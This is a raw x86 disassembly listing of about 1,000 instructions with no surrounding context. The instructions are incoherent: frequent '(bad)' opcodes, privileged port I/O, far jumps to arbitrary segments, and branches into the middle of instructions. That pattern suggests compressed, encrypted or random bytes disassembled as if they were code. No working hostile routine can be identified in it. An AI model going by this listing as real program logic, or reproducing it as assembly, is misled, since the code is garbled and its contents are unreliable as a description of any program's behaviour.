  415e3d:	in     al,0xdd
  415e3f:	jne    0x415e7c
  415e41:	and    DWORD PTR [eax],edx
  415e43:	lods   al,BYTE PTR ds:[esi]
  415e44:	and    ah,al
  415e46:	popf   
  415e47:	fimul  WORD PTR [ebp-0x22da835e]
  415e4d:	ds aas 
  415e4f:	jo     0x415e6a
  415e51:	cs xchg ebp,eax
  415e53:	jo     0x415e46
  415e55:	pop    ds
  415e56:	or     cl,BYTE PTR ss:[ebx]
  415e59:	int    0x52
  415e5b:	xchg   edi,eax
  415e5c:	mov    al,ds:0x1c942bbf
  415e61:	sub    dh,BYTE PTR [ecx]
  415e63:	outs   dx,DWORD PTR ds:[esi]
  415e64:	cwde   
  415e65:	xchg   ebp,eax
  415e66:	mov    ch,0x57
  415e68:	xor    BYTE PTR [ebp+0x2cc43f11],bl
  415e6e:	xchg   edx,eax
  415e6f:	xchg   ebx,eax
  415e70:	pop    ebx
  415e71:	adc    eax,0x9d803f65
  415e76:	pop    edx
  415e77:	imul   dx,WORD PTR [esi-0x2779cfc3],0xffa1
  415e7f:	sub    BYTE PTR [ebp+0x166324bf],0xd0
  415e86:	mov    ah,0xa8
  415e88:	lock mov ch,0x59
  415e8b:	xchg   esp,eax
  415e8c:	ret    
  415e8d:	fisubr DWORD PTR [eax+0x382e3939]
  415e93:	jae    0x415e8f
  415e95:	add    al,0xdc
  415e97:	sbb    al,0x90
  415e99:	or     al,0x62
  415e9b:	push   0x14
  415e9d:	xor    DWORD PTR [ecx],ecx
  415e9f:	gs or  al,0xf9
  415ea2:	call   0x2e27:0xc53fd8cd
  415ea9:	aam    0xc2
  415eab:	lock sub eax,0x7bb71e10
  415eb1:	retf   
  415eb2:	je     0x415e74
  415eb4:	jbe    0x415ed1
  415eb6:	jle    0x415e70
  415eb8:	add    al,0x53
  415eba:	lahf   
  415ebb:	and    DWORD PTR [eax],eax
  415ebd:	daa    
  415ebe:	cdq    
  415ebf:	sbb    BYTE PTR [esi-0x54],bl
  415ec2:	or     al,0xc
  415ec4:	sbb    DWORD PTR [edi-0x73c20b2f],esi
  415eca:	(bad)  
  415ecb:	lock mov edi,eax
  415ece:	call   0x4538cd47
  415ed3:	vmread DWORD PTR [edx*4+0xbd0a215],ebx
  415edb:	mov    esi,0x9d4c247
  415ee0:	aaa    
  415ee1:	dec    esp
  415ee2:	and    dh,BYTE PTR [ebx]
  415ee4:	sub    BYTE PTR [edi+0x29],dh
  415ee7:	adc    eax,0x7508b8fa
  415eec:	ret    0x403a
  415eef:	dec    eax
  415ef0:	rol    DWORD PTR [edx],cl
  415ef2:	xor    eax,0xf030dc63
  415ef7:	int3   
  415ef8:	inc    BYTE PTR [eax+0x27d788ac]
  415efe:	mov    eax,0x734965ed
  415f03:	not    DWORD PTR [edi]
  415f05:	adc    eax,0x3a37382
  415f0a:	test   al,0x2
  415f0c:	js     0x415ead
  415f0e:	or     al,0x1d
  415f10:	je     0x415ed7
  415f12:	inc    edx
  415f13:	adc    al,0x6c
  415f15:	test   BYTE PTR [edi+0x50679b3f],ch
  415f1b:	shl    BYTE PTR [edi+eax*8],1
  415f1e:	jne    0x415ed9
  415f20:	ds cmp eax,0xfd2a0c56
  415f26:	jae    0x415f9d
  415f28:	dec    ecx
  415f29:	test   BYTE PTR [esi+0x76],bh
  415f2c:	scas   eax,DWORD PTR es:[edi]
  415f2d:	rol    DWORD PTR [eax+0x5d71cf60],1
  415f33:	hlt    
  415f34:	fmul   DWORD PTR [ecx+0x45]
  415f37:	dec    eax
  415f38:	aaa    
  415f39:	aam    0x29
  415f3b:	or     cl,ah
  415f3d:	pop    ebx
  415f3e:	inc    ecx
  415f3f:	push   cs
  415f40:	pop    eax
  415f41:	arpl   WORD PTR [esi+0x2d],cx
  415f44:	mov    esi,0x5bc53d54
  415f49:	cdq    
  415f4a:	jecxz  0x415f82
  415f4c:	add    eax,0x57fb4742
  415f51:	(bad)  
  415f53:	adc    dh,BYTE PTR [ebx+esi*8]
  415f56:	jge    0x415f2d
  415f58:	mov    eax,ds:0x7482359f
  415f5d:	sub    al,0x45
  415f5f:	inc    esi
  415f60:	sub    BYTE PTR [edi],cl
  415f62:	dec    edi
  415f63:	ss js  0x415eea
  415f66:	js     0x415f6c
  415f68:	pop    ebp
  415f69:	sub    eax,0xbd93e3f9
  415f6e:	sahf   
  415f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f70:	fidiv  WORD PTR [edx+0x3aba94f9]
  415f76:	lods   eax,DWORD PTR ds:[esi]
  415f77:	jmp    0x415f38
  415f79:	or     BYTE PTR [ebp-0x2e],cl
  415f7c:	retf   0x7e65
  415f7f:	int3   
  415f80:	outs   dx,DWORD PTR ds:[esi]
  415f81:	xor    al,bh
  415f83:	ror    bh,cl
  415f85:	cmp    DWORD PTR [ecx-0x5f],edi
  415f88:	sub    al,0x54
  415f8a:	ret    
  415f8b:	stc    
  415f8c:	pop    ss
  415f8d:	fist   DWORD PTR [edi]
  415f8f:	fnstsw WORD PTR [ecx]
  415f91:	sub    al,0x81
  415f93:	mov    eax,0x147844f3
  415f98:	sahf   
  415f99:	shr    DWORD PTR [esi-0x18],cl
  415f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f9d:	(bad)  
  415f9e:	bound  ebx,QWORD PTR [edi+0x45]
  415fa1:	add    eax,0x7ec36f1f
  415fa6:	dec    esp
  415fa7:	mov    edx,0x45cc6a9d
  415fac:	mov    ecx,0x802f90e0
  415fb1:	shr    BYTE PTR [eax-0x1d8c10d7],0x70
  415fb8:	push   eax
  415fb9:	xchg   esp,eax
  415fba:	jno    0x41601f
  415fbc:	jo     0x415f67
  415fbe:	sub    BYTE PTR [edx],dl
  415fc0:	inc    ecx
  415fc1:	and    BYTE PTR [ebx-0x627ee6db],dh
  415fc7:	imul   edi,DWORD PTR [eax],0x5a2c4abd
  415fcd:	push   ebx
  415fce:	mov    esp,DWORD PTR [ecx+0x5230b0c5]
  415fd4:	pop    ds
  415fd5:	jmp    0x9629:0xed0b60f
  415fdc:	xor    esp,edx
  415fde:	mov    eax,0xb86d87a3
  415fe3:	dec    ecx
  415fe4:	add    ebp,edi
  415fe6:	push   0x56
  415fe8:	lahf   
  415fe9:	sub    DWORD PTR [ebx+0x704d41e8],ebx
  415fef:	and    bl,dl
  415ff1:	iret   
  415ff2:	mov    edi,0x8070eebb
  415ff7:	sub    al,0xac
  415ff9:	xchg   edx,eax
  415ffa:	fistp  QWORD PTR [ebx]
  415ffc:	push   ecx
  415ffd:	mov    esp,0x3947de6d
  416002:	pop    ebx
  416003:	(bad)  
  416004:	mov    ebx,0x7e991137
  416009:	and    cl,ch
  41600b:	or     DWORD PTR [ebx+esi*8],edi
  41600e:	stos   DWORD PTR es:[edi],eax
  41600f:	jbe    0x416042
  416011:	cmp    DWORD PTR [edx+0x678ec4e1],edx
  416017:	mov    edx,0x5bb98d77
  41601c:	mov    edx,0xdb519338
  416021:	test   al,0x1e
  416023:	add    eax,0x7abb5d07
  416028:	nop
  416029:	mov    ds:0xae94fc53,eax
  41602e:	mov    ebx,0x8710d1c7
  416033:	jo     0x41600f
  416035:	retf   0xf2e6
  416038:	jns    0x416062
  41603a:	mov    ebx,0xa0737ce1
  41603f:	out    0x27,eax
  416041:	sbb    al,BYTE PTR [eax]
  416043:	ja     0x416016
  416045:	std    
  416046:	fwait
  416047:	xchg   esp,eax
  416048:	push   0x7cafede2
  41604d:	add    edi,DWORD PTR [ecx]
  41604f:	dec    edi
  416050:	call   FWORD PTR [eax+ebp*4-0x7d]
  416054:	sub    dh,BYTE PTR [ebx+0x642f9e7c]
  41605a:	ins    DWORD PTR es:[edi],dx
  41605b:	pop    eax
  41605c:	call   0x2cb40b43
  416061:	add    ah,BYTE PTR [esp+edx*2]
  416064:	push   edx
  416065:	sbb    eax,0xe28ba41
  41606a:	jmp    0x41605e
  41606c:	jns    0x41604c
  41606e:	mov    si,0x2813
  416072:	das    
  416073:	or     DWORD PTR [edi-0x2d],ebp
  416076:	aaa    
  416077:	pop    ecx
  416078:	fisttp QWORD PTR [edx+ecx*4+0x7c8ac8ca]
  41607f:	int    0x2b
  416081:	inc    ecx
  416082:	push   ecx
  416083:	inc    ebx
  416084:	sar    DWORD PTR [esi+edi*2-0x5],0x95
  416089:	ss mov ?,esi
  41608c:	add    DWORD PTR [edi],esp
  41608e:	inc    esi
  41608f:	mov    esp,0x50a3fba7
  416094:	ret    0x2747
  416097:	test   BYTE PTR [ebx+0x78],bh
  41609a:	sbb    BYTE PTR [ebp-0x77842a15],0x30
  4160a1:	xor    eax,0x2d83c0c3
  4160a6:	jo     0x4160b1
  4160a8:	rcl    esp,0xe8
  4160ab:	in     al,0x17
  4160ad:	imul   edx,DWORD PTR [ebx-0x36e12e4f],0x19e09f50
  4160b7:	pop    ds
  4160b8:	or     BYTE PTR [eax+0x45f93ff0],cl
  4160be:	adc    ebp,ecx
  4160c0:	(bad)  
  4160c1:	or     bh,dh
  4160c3:	xor    eax,0xe1f937a5
  4160c8:	add    ebx,DWORD PTR [edx+0x57db93d1]
  4160ce:	or     al,0x73
  4160d0:	retf   
  4160d1:	test   al,0xd7
  4160d3:	std    
  4160d4:	and    al,BYTE PTR [esi]
  4160d6:	xchg   esi,eax
  4160d7:	jbe    0x416075
  4160d9:	int    0x8e
  4160db:	loop   0x4160ee
  4160dd:	adc    eax,0x6a0de9c6
  4160e2:	xchg   esi,eax
  4160e3:	aas    
  4160e4:	mov    esp,0x9b4762f7
  4160e9:	mov    dl,0x27
  4160eb:	inc    edi
  4160ec:	mov    al,ds:0xcd331b24
  4160f1:	nop
  4160f2:	mov    esp,DWORD PTR [ebx*8-0x179d0aae]
  4160f9:	mov    BYTE PTR [edi-0x77aedcdc],cl
  4160ff:	pushf  
  416100:	jnp    0x4160cf
  416102:	jecxz  0x41615b
  416104:	jo     0x41613a
  416106:	pop    ds
  416107:	push   esi
  416108:	call   0x693fd50
  41610d:	ja     0x4160e9
  41610f:	pop    eax
  416110:	iret   
  416111:	xchg   edi,eax
  416112:	and    al,0xcd
  416114:	(bad)  
  416116:	xor    BYTE PTR [eax],dh
  416118:	pop    esp
  416119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41611a:	xor    DWORD PTR [eax+eiz*2-0x711f714b],ebp
  416121:	bound  ebp,QWORD PTR [esi+0x77]
  416124:	gs das 
  416126:	xor    BYTE PTR [ebx+0x5a],al
  416129:	adc    al,0x76
  41612b:	ins    BYTE PTR es:[edi],dx
  41612c:	in     al,0x21
  41612e:	retf   0xed75
  416131:	or     edi,eax
  416133:	mov    edi,0x90f127ec
  416138:	xchg   edi,eax
  416139:	push   esi
  41613a:	inc    ebx
  41613b:	frstor [esi+0x30]
  41613e:	mov    ecx,?
  416140:	jmp    eax
  416142:	mov    cl,0x18
  416144:	ds mov ecx,0x1263d3cb
  41614a:	inc    esi
  41614b:	jmp    0xcb38f22e
  416150:	and    edi,DWORD PTR [esi]
  416152:	dec    esi
  416153:	mov    edi,ebx
  416155:	mov    edi,0xedb12a40
  41615a:	dec    edx
  41615b:	cli    
  41615c:	or     dh,cl
  41615e:	mov    bl,0xd3
  416160:	mov    ebx,0x366fdbb8
  416165:	mov    ebp,0x146766b2
  41616a:	sbb    eax,0x68c14ade
  41616f:	mov    al,0x7c
  416171:	rol    BYTE PTR [eax],0x9d
  416174:	or     al,0xce
  416176:	jns    0x41610f
  416178:	aaa    
  416179:	gs dec esp
  41617b:	imul   ebp,DWORD PTR [eax+0x4d],0xffffffd8
  41617f:	mov    DWORD PTR [ecx],0x62564952
  416185:	inc    edx
  416186:	or     al,0x5c
  416188:	or     al,0x1e
  41618a:	popa   
  41618b:	out    0xbc,al
  41618d:	dec    eax
  41618e:	or     BYTE PTR [ebx-0x25ef0625],bl
  416194:	aaa    
  416195:	jge    0x416165
  416197:	jmp    0x4161f0
  416199:	dec    edi
  41619a:	cmp    al,0x8d
  41619c:	add    DWORD PTR [ecx-0x425c512a],eax
  4161a2:	or     al,cl
  4161a4:	mov    eax,ds:0xa54d41da
  4161a9:	mov    dl,0x8e
  4161ab:	pop    es
  4161ac:	cli    
  4161ad:	lods   al,BYTE PTR ds:[esi]
  4161ae:	or     ah,BYTE PTR [ebx]
  4161b0:	sbb    al,0x5c
  4161b2:	xor    DWORD PTR [ebx+0x74],ebp
  4161b5:	cmp    DWORD PTR [ebx],ebp
  4161b7:	jmp    0xde04d31
  4161bc:	jecxz  0x4161b3
  4161be:	push   ebp
  4161bf:	rol    DWORD PTR [edi+0x5b],cl
  4161c2:	rcr    DWORD PTR [ecx+0x1f98f830],1
  4161c8:	sub    BYTE PTR [ebx+eiz*4+0x66cbfba9],ch
  4161cf:	mov    ebp,0xa72d902d
  4161d4:	sar    DWORD PTR [esi-0x1e9cbd30],0xe8
  4161db:	out    dx,al
  4161dc:	scas   al,BYTE PTR es:[edi]
  4161dd:	jno    0x4161a5
  4161df:	adc    BYTE PTR [edi+0x4763e530],0x7a
  4161e6:	pushf  
  4161e7:	loope  0x4161f8
  4161e9:	fild   WORD PTR [esi]
  4161eb:	sub    eax,esi
  4161ed:	cwde   
  4161ee:	jecxz  0x4161a0
  4161f0:	or     esp,0xfffffffe
  4161f3:	mov    ebp,DWORD PTR [edi]
  4161f5:	jmp    0xfdc5:0x315cf24a
  4161fc:	jl     0x4161e3
  4161fe:	aam    0xff
  416200:	in     al,0xf9
  416202:	push   edx
  416203:	jmp    0x416193
  416205:	les    esp,FWORD PTR [esi]
  416207:	pop    ebp
  416208:	ret    
  416209:	adc    al,0x7b
  41620b:	mov    ecx,0x5ec123dd
  416210:	cwde   
  416211:	or     BYTE PTR [edx+0x71],ah
  416214:	cld    
  416215:	jg     0x416239
  416217:	ins    DWORD PTR es:[edi],dx
  416218:	addr16 push eax
  41621a:	(bad)  
  41621b:	int3   
  41621c:	aam    0xdd
  41621e:	dec    esi
  41621f:	pop    es
  416220:	push   eax
  416221:	pop    ecx
  416222:	fcomp  QWORD PTR [eax-0x4c]
  416225:	adc    bh,al
  416227:	pop    ebp
  416228:	fild   WORD PTR [ebp-0x5827dfeb]
  41622e:	sub    cl,BYTE PTR [eax-0x5c981c55]
  416234:	pslld  mm4,mm3
  416237:	mov    edx,DWORD PTR [esp+ecx*4]
  41623a:	pop    esp
  41623b:	dec    edi
  41623c:	out    0x31,eax
  41623e:	push   ebp
  41623f:	mov    WORD PTR [ecx-0xb469db8],es
  416245:	dec    eax
  416246:	cmc    
  416247:	outs   dx,DWORD PTR ds:[esi]
  416248:	dec    ecx
  416249:	mov    al,0x16
  41624b:	push   esi
  41624c:	mov    ds:0x19d1b2eb,eax
  416251:	dec    ebx
  416252:	lods   al,BYTE PTR ds:[esi]
  416253:	shr    BYTE PTR [edx-0x59e94674],0xb7
  41625a:	push   esi
  41625b:	push   ds
  41625c:	aad    0x54
  41625e:	out    dx,eax
  41625f:	call   0xae8df785
  416264:	js     0x4162dc
  416266:	jo     0x4162a1
  416268:	mov    DWORD PTR [eax+0x6cb9dd4d],edx
  41626e:	or     ch,0x14
  416271:	mov    edi,0x6c61826e
  416276:	dec    eax
  416277:	pop    edx
  416278:	and    bl,BYTE PTR [eax+0x30c6707d]
  41627e:	sahf   
  41627f:	lods   al,BYTE PTR ds:[esi]
  416280:	adc    eax,0xc2bf9c65
  416285:	pop    eax
  416286:	cmp    eax,0xab312f97
  41628b:	cmp    al,0x6
  41628d:	push   esp
  41628e:	fwait
  41628f:	jae    0x41623c
  416291:	test   BYTE PTR [esi-0x61],dh
  416294:	int    0x53
  416296:	pop    esi
  416297:	(bad)  
  416298:	pop    es
  416299:	out    0xb7,eax
  41629b:	inc    edi
  41629c:	inc    edi
  41629d:	mov    BYTE PTR [edx],bl
  41629f:	pop    es
  4162a0:	pop    es
  4162a1:	aaa    
  4162a2:	test   ebx,esi
  4162a4:	mov    edx,0x2d1110c9
  4162a9:	or     al,0xd9
  4162ab:	mov    ds:0x8d0f87a0,eax
  4162b0:	hlt    
  4162b1:	mov    esp,0xad7c4353
  4162b6:	pop    ebx
  4162b7:	inc    ebx
  4162b8:	jp     0x416270
  4162ba:	adc    BYTE PTR [eax+0x6ef7338e],al
  4162c0:	xchg   edx,eax
  4162c1:	gs pmaddwd mm3,mm1
  4162c5:	xchg   ebp,eax
  4162c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162c7:	push   ds
  4162c8:	push   0x4
  4162ca:	cmc    
  4162cb:	xchg   esi,eax
  4162cc:	xchg   edx,eax
  4162cd:	mov    ebx,0x15ea94e5
  4162d2:	shl    ecx,0x51
  4162d5:	mov    DWORD PTR [edi-0x6be7165b],esi
  4162db:	adc    al,cl
  4162dd:	shr    cl,0xba
  4162e0:	ja     0x41634a
  4162e2:	mov    dl,0x23
  4162e4:	xchg   ecx,eax
  4162e5:	cmc    
  4162e6:	inc    esi
  4162e7:	pop    ss
  4162e8:	scas   al,BYTE PTR es:[edi]
  4162e9:	ja     0x4162db
  4162eb:	bound  eax,QWORD PTR [ebp+0x64]
  4162ee:	push   esi
  4162ef:	ins    DWORD PTR es:[edi],dx
  4162f0:	imul   edx,DWORD PTR [edi+esi*1+0x2f],0x6e890b81
  4162f8:	out    0xfb,al
  4162fa:	xchg   ecx,eax
  4162fb:	stos   DWORD PTR es:[edi],eax
  4162fc:	and    BYTE PTR [edx-0x7626bee3],bl
  416302:	fndisi(8087 only) 
  416304:	dec    ecx
  416305:	je     0x4162d1
  416307:	rcr    DWORD PTR [esi-0x1f],1
  41630a:	arpl   WORD PTR [edi+0x3a],sp
  41630d:	xchg   ecx,esp
  41630f:	pop    eax
  416310:	push   esp
  416311:	xor    esp,DWORD PTR [ebp+0x5f5c965f]
  416317:	repz ficomp WORD PTR [edx-0xe90067b]
  41631e:	out    0x17,al
  416320:	ja     0x416392
  416322:	pop    ebp
  416323:	push   edx
  416324:	and    BYTE PTR [ebx-0x74],ch
  416327:	jl     0x4162b5
  416329:	aas    
  41632a:	lea    ecx,[esi-0xf]
  41632d:	jno    0x41630b
  41632f:	ret    
  416330:	cmp    DWORD PTR [edx],edx
  416332:	xchg   esp,eax
  416333:	xchg   DWORD PTR [ecx],eax
  416335:	int3   
  416336:	fisubr WORD PTR [ebp-0x59]
  416339:	or     BYTE PTR fs:[ecx+edx*8-0x1bdf4847],ch
  416341:	sti    
  416342:	sub    DWORD PTR [edi],edi
  416344:	imul   ecx,DWORD PTR [edx],0xffffff93
  416347:	jge    0x41630d
  416349:	mov    BYTE PTR [edi],dh
  41634b:	jns    0x416309
  41634d:	add    ecx,DWORD PTR [eax-0x2c]
  416350:	sbb    DWORD PTR ds:0x7e789629,ecx
  416356:	xchg   ch,bh
  416358:	retf   
  416359:	push   edx
  41635a:	dec    edx
  41635b:	imul   BYTE PTR [edx+0x58]
  41635e:	jg     0x4162f2
  416360:	data16 mov bh,0x4f
  416363:	sbb    BYTE PTR [ebx-0x7f81a18e],cl
  416369:	out    0x30,al
  41636b:	jecxz  0x4163e5
  41636d:	lods   eax,DWORD PTR ds:[esi]
  41636e:	(bad)  
  41636f:	push   ebx
  416370:	int3   
  416371:	mov    esi,0x35c6625f
  416376:	mov    dl,cl
  416378:	fiadd  DWORD PTR [edx-0x77]
  41637b:	(bad)  
  41637c:	or     BYTE PTR [ecx+ecx*2-0x2],ah
  416380:	jb     0x416309
  416382:	add    edi,DWORD PTR [edi]
  416384:	jmp    0x4163ef
  416386:	mov    ebp,0x5c766703
  41638b:	xor    dl,dh
  41638d:	xor    al,ah
  41638f:	mov    ah,0x3b
  416391:	or     BYTE PTR [ebx],cl
  416393:	mov    ebp,?
  416395:	les    ecx,FWORD PTR [eax]
  416397:	push   ebp
  416398:	data16 lahf 
  41639a:	aad    0x6c
  41639c:	add    bl,BYTE PTR [edx+0x147053df]
  4163a2:	in     eax,dx
  4163a3:	loope  0x416399
  4163a5:	std    
  4163a6:	jp     0x4163af
  4163a8:	cmp    DWORD PTR [ebp-0x532bf30e],esp
  4163ae:	stos   BYTE PTR es:[edi],al
  4163af:	std    
  4163b0:	imul   esp,DWORD PTR [edx+ecx*8],0xffffffce
  4163b4:	data16 jbe 0x416350
  4163b7:	in     al,0xfd
  4163b9:	retf   0x332
  4163bc:	and    eax,DWORD PTR [ebp+0x1f]
  4163bf:	imul   edx,DWORD PTR [edx+edx*8+0x582e7fae],0x2612970d
  4163ca:	ret    0x4066
  4163cd:	fwait
  4163ce:	lea    esi,[eax-0x6a]
  4163d1:	shl    DWORD PTR ds:[esi+0x395e474],0xa7
  4163d9:	mov    bh,0xb8
  4163db:	ins    BYTE PTR es:[edi],dx
  4163dc:	pop    ds
  4163dd:	bound  ecx,QWORD PTR [edi+ecx*4+0x59]
  4163e1:	xchg   BYTE PTR [esp+edx*8],dh
  4163e4:	int3   
  4163e5:	pusha  
  4163e6:	cmp    DWORD PTR [edx*1+0x16adc9a6],esi
  4163ed:	push   es
  4163ee:	pop    edi
  4163ef:	addr16 gs dec ebp
  4163f2:	fcomp  DWORD PTR [ebp+0x30]
  4163f5:	xor    esi,esi
  4163f7:	push   esp
  4163f8:	in     eax,dx
  4163f9:	in     eax,dx
  4163fa:	fisubr WORD PTR [ebx-0x5b]
  4163fd:	stos   DWORD PTR es:[edi],eax
  4163fe:	xchg   ebp,eax
  4163ff:	and    BYTE PTR [edx],dl
  416401:	xlat   BYTE PTR ds:[ebx]
  416402:	add    DWORD PTR ds:[edi-0x16c48096],edx
  416409:	or     al,0x53
  41640b:	dec    ebx
  41640c:	loop   0x4163fa
  41640e:	mov    dh,0xb8
  416410:	das    
  416411:	or     dl,BYTE PTR [edi+ecx*4+0x61]
  416415:	ins    BYTE PTR es:[edi],dx
  416416:	ja     0x416416
  416418:	and    al,0xfe
  41641a:	mov    cl,al
  41641c:	dec    DWORD PTR [edi]
  41641e:	mov    dl,BYTE PTR [edx+0x35c42af6]
  416424:	bound  ebp,QWORD PTR [eax+ebp*1]
  416427:	loopne 0x41644f
  416429:	test   eax,0xfb18c28c
  41642e:	mov    ebx,0x890f68d1
  416433:	or     al,0x41
  416435:	scas   al,BYTE PTR es:[edi]
  416436:	repz int 0xe3
  416439:	and    BYTE PTR [ebp+0x36],0x45
  41643d:	in     al,dx
  41643e:	mov    cl,0x77
  416440:	cmp    eax,0x1347c34e
  416445:	test   esi,eax
  416447:	xchg   DWORD PTR [edx*2+0x1971247b],ebp
  41644e:	or     eax,0xba07e08f
  416453:	push   es
  416454:	and    eax,0xd932a663
  416459:	fwait
  41645a:	mov    eax,ds:0xbe17bd3c
  41645f:	push   esi
  416460:	fcom   DWORD PTR [esi-0x2c46c531]
  416466:	and    ecx,edx
  416468:	es call 0xe266:0x72da1a4
  416470:	adc    BYTE PTR [edi+0x1a57190c],ah
  416476:	mov    esi,0x698ae06
  41647b:	test   DWORD PTR [ecx+edi*4+0x633b0b7],edx
  416482:	repz and ebx,DWORD PTR [eax]
  416485:	jmp    0x416416
  416487:	js     0x416433
  416489:	(bad)  
  41648a:	push   edi
  41648b:	popa   
  41648c:	sub    ch,BYTE PTR [ecx]
  41648e:	shl    DWORD PTR [eax-0x4e],cl
  416491:	imul   ebx,DWORD PTR [esi+0x29e47ee6],0xffffffdb
  416498:	adc    al,0x26
  41649a:	inc    edi
  41649b:	pop    esi
  41649c:	es ins WORD PTR es:[edi],dx
  41649f:	scas   eax,DWORD PTR es:[edi]
  4164a0:	xor    esi,edx
  4164a2:	call   0xdddc:0xef46848d
  4164a9:	xlat   BYTE PTR ds:[ebx]
  4164aa:	adc    ebx,ebx
  4164ac:	cli    
  4164ad:	das    
  4164ae:	sbb    bh,ch
  4164b0:	mov    ch,0xa1
  4164b2:	xchg   esp,eax
  4164b3:	mov    ch,0x59
  4164b5:	mov    WORD PTR [eax],fs
  4164b7:	jno    0x416451
  4164b9:	loop   0x416506
  4164bb:	imul   edi,DWORD PTR fs:0xa676f306,0x43fbbf68
  4164c6:	repz das 
  4164c8:	jecxz  0x416458
  4164ca:	inc    BYTE PTR [edx-0x1038c395]
  4164d0:	out    0x24,eax
  4164d2:	(bad)  [ebp-0x1e]
  4164d5:	push   es
  4164d6:	xlat   BYTE PTR ds:[ebx]
  4164d7:	mov    BYTE PTR [ebx],bh
  4164d9:	(bad)  
  4164db:	stos   DWORD PTR es:[edi],eax
  4164dc:	mov    ch,0x1a
  4164de:	(bad)  
  4164e0:	or     eax,0x8b11351f
  4164e5:	lods   eax,DWORD PTR ds:[esi]
  4164e6:	xor    BYTE PTR [esi],bh
  4164e8:	and    al,0x98
  4164ea:	sub    eax,0xbed5f557
  4164ef:	or     eax,0xb776368
  4164f4:	cli    
  4164f5:	add    eax,0x272016b9
  4164fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164fb:	test   eax,0xcf5ae0e2
  416500:	repz addr16 push cs
  416503:	clc    
  416504:	pop    ecx
  416505:	adc    eax,0x805e9590
  41650a:	inc    esp
  41650b:	pop    esp
  41650c:	stc    
  41650d:	fldenv [eax+0x2a]
  416510:	mov    edi,0xb51fe03f
  416515:	mov    DWORD PTR [ebx],edi
  416517:	and    eax,0x26063a17
  41651c:	movd   DWORD PTR [ebp-0x2d],mm0
  416520:	jb     0x416574
  416522:	dec    ebp
  416523:	fsubr  DWORD PTR [edx+0x1]
  416526:	push   edx
  416527:	pop    ecx
  416528:	cld    
  416529:	addr16 int3 
  41652b:	jmp    0x7770:0x2fab67db
  416532:	es inc ecx
  416534:	fs ss xchg bp,ax
  416538:	add    DWORD PTR [edi+ebx*2+0x41f93f4e],ebp
  41653f:	cmp    BYTE PTR [esp+ebp*8+0x38],dl
  416543:	add    al,0x5f
  416545:	lea    edi,[eax]
  416547:	push   ss
  416548:	mov    edi,0xf891c894
  41654d:	pusha  
  41654e:	addr16 xchg esp,eax
  416550:	loope  0x4165a7
  416552:	xchg   esi,eax
  416553:	retf   
  416554:	ss xchg esi,eax
  416556:	repnz xchg edx,eax
  416558:	mov    ebp,0x5dbdd222
  41655d:	mov    ecx,0x76b1f007
  416562:	push   0x28
  416564:	leave  
  416565:	push   cs
  416566:	add    DWORD PTR [edx],ecx
  416568:	inc    ebp
  416569:	mov    ch,0x8e
  41656b:	inc    esp
  41656c:	cmp    bl,cl
  41656e:	xchg   esi,eax
  41656f:	ins    DWORD PTR es:[edi],dx
  416570:	sbb    edx,ebx
  416572:	pop    ebx
  416573:	adc    eax,0xf94a2b3d
  416578:	(bad)  
  416579:	jecxz  0x416548
  41657b:	fdivr  st,st(1)
  41657d:	sub    DWORD PTR [edx],ebp
  41657f:	arpl   WORD PTR [esi],cx
  416581:	push   ecx
  416582:	sar    BYTE PTR [eax-0x6c511c4f],1
  416588:	push   esi
  416589:	pop    ebx
  41658a:	push   ds
  41658b:	out    dx,eax
  41658c:	push   edi
  41658d:	mov    cl,0xea
  41658f:	jle    0x416528
  416591:	outs   dx,DWORD PTR ds:[esi]
  416592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416593:	mov    al,0x54
  416595:	clc    
  416596:	(bad)  
  416597:	hlt    
  416598:	mov    esi,0xe20a90c1
  41659d:	mov    bh,0x6e
  41659f:	(bad)  [ecx+0x47]
  4165a2:	mov    ecx,0x52a8db25
  4165a7:	sbb    DWORD PTR [ebp+esi*8-0x7b],ecx
  4165ab:	adc    eax,0x74aa1963
  4165b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165b1:	push   0xd0f0c3a2
  4165b6:	je     0x4165a8
  4165b8:	xchg   edx,eax
  4165b9:	hlt    
  4165ba:	loopne 0x4165d2
  4165bc:	xchg   BYTE PTR [esi+edi*8],cl
  4165bf:	mov    eax,ss
  4165c1:	(bad)  ds:0x6710670c
  4165c7:	test   al,0xbf
  4165c9:	cwde   
  4165ca:	dec    esp
  4165cb:	mov    ebp,0xccb950a5
  4165d0:	mov    al,ds:0x6153792f
  4165d5:	push   ds
  4165d6:	jle    0x4165bb
  4165d8:	jge    0x4165bd
  4165da:	jmp    0x36c89a30
  4165df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165e0:	mov    eax,0x22b8fa93
  4165e5:	xor    edi,esp
  4165e7:	js     0x4165df
  4165e9:	jbe    0x41657c
  4165eb:	cmp    edx,DWORD PTR [edi+0x56]
  4165ee:	pop    edi
  4165ef:	jae    0x416663
  4165f1:	fiadd  DWORD PTR [ebx]
  4165f3:	add    al,0xd0
  4165f5:	push   es
  4165f6:	ficom  WORD PTR [edx]
  4165f8:	aam    0x8b
  4165fa:	xlat   BYTE PTR ds:[ebx]
  4165fb:	gs push ds
  4165fd:	call   0x6301258e
  416602:	inc    ebp
  416603:	mov    WORD PTR [ebp+0x847341c],es
  416609:	push   0x2492105
  41660e:	lds    esp,FWORD PTR [edx+0x61257e35]
  416614:	push   es
  416615:	jbe    0x41665a
  416617:	das    
  416618:	mov    edi,0x131618e6
  41661d:	and    ebx,edx
  41661f:	inc    ebx
  416620:	ins    DWORD PTR es:[edi],dx
  416621:	mov    cl,0x7d
  416623:	pop    edi
  416624:	adc    BYTE PTR [edx+0x4b5eba91],cl
  41662a:	xor    BYTE PTR ds:[ebx+edi*4],dl
  41662e:	jl     0x4165d9
  416630:	fdivr  DWORD PTR [edi]
  416632:	pop    es
  416633:	mov    ds:0x18bf1cd8,al
  416638:	adc    ecx,DWORD PTR [esi]
  41663a:	add    al,ah
  41663c:	mov    al,ds:0xb201acfd
  416641:	xor    eax,0x8d41af6
  416646:	adc    bh,BYTE PTR [ecx]
  416648:	enter  0x5ce1,0x58
  41664c:	cmp    bh,bh
  41664e:	xlat   BYTE PTR ds:[ebx]
  41664f:	div    DWORD PTR [esi]
  416651:	std    
  416652:	aas    
